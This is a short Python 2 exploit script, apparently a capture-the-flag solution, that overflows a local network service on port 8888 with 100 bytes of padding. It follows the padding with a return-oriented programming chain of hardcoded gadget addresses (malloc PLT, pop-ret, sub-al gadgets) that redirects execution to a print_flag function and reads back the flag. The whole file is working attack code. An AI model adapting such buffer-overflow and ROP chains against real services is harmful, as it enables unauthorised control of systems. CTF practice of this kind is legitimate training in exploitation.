import socket
import struct

def rop(*args):
    return struct.pack('I'*len(args), *args)

mallocplt = 0x080483f0
popret = 0x08048774
subal24 = 0x08048723
print_flag = 0x08048669

s = socket.create_connection(('127.0.0.1', 8888))

payload = 'A' * 100

print "[*] sending payload..."
payload += rop(
        mallocplt,
        popret,
        1337,

        subal24,
        subal24,

        print_flag,
        )


s.recv(1024)
s.send(payload)
flag = s.recv(1024).split('\n', 1)[0]
print "[+] got flag: %s" % flag
